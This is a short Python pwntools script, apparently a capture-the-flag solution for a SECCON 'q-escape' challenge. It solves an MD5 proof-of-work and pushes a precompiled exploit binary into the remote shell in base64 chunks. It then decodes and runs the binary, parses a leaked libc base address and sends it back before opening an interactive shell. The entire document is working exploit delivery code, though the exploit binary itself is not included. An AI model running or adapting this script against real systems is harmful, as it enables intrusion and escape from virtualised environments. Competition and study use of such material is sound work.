from pwn import *
from hashlib import md5
import sys, os

def pow(prefix):
    i = 0
    while True:
        if md5(prefix + "%x"%i).hexdigest().startswith('000000'):
            log.info('Found : ' + hex(i))
            return hex(i)[2:]
        i += 1

if __name__ == '__main__':
    s = remote('q-escape.pwn.seccon.jp', 1337)
    prefix = s.recvuntil(': ').split('md5("')[1].split('"')[0]
    s.sendline(pow(prefix))
    
    s.recvuntil("/ # ")
    s.sendline("touch b")

    exploit = open('exp.gz', 'rb').read()
    exploit_b64 = exploit.encode('base64')

    for i in range(0, len(exploit_b64), 1000):
        s.recvuntil("/ # ")
        command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" >> b"
        s.sendline(command)

    s.sendline("")
    s.sendline("")
    s.sendlineafter("/ # ", "cat b | base64 -d > a.gz")
    s.sendlineafter("/ # ", "gzip -d a.gz")
    s.sendlineafter("/ # ", "chmod +x ./a")
    s.sendlineafter("/ # ", "./a")
    s.recvuntil('/ # ./a')
    re = s.recvuntil('wait for leak...')
    print re
    libc = int(re.split('\n')[-3].split(' ')[3], 16) - 0xd7499d
    log.info('libc base : ' + hex(libc))
    s.sendline('{0}'.format(hex(libc)))
    s.interactive()
    s.close()
